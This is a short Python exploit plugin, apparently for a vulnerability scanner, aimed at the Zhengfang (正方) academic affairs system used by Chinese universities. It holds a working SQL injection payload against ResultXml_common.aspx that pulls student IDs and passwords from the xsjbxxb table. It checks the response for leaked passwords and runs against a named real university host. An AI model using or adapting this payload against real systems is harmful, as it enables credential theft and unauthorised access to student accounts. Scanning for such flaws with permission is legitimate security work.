#!/usr/bin/env python
# -*- coding: utf-8 -*-
#title 正方教务系统SQL注入获取账户密码
# payload  /ResultXml_common.aspx?k=%&column='[username='||xh||']['||'passwd='||mm||']'&table=xsjbxxb+where+rownum<=10--

def assign(service, arg):
    if service == "zfsoft": #正方教务系统,service不对，管理帮忙改下吧
        return True, arg

def audit(arg):
    payload ="ResultXml_common.aspx?k=%&column='[username='||xh||']['||'passwd='||mm||']'&table=xsjbxxb+where+rownum<=10--"
    verify_url =arg + payload
    code, head, res, errcode, _ = curl.curl2(verify_url)
    if code == 200 and '<?xml version=' in res and '][passwd=' in res:
        security_hole(verify_url)
if __name__ == '__main__':
    from dummy import *
    audit(assign('zfsoft', 'http://jwc1.usst.edu.cn/')[1])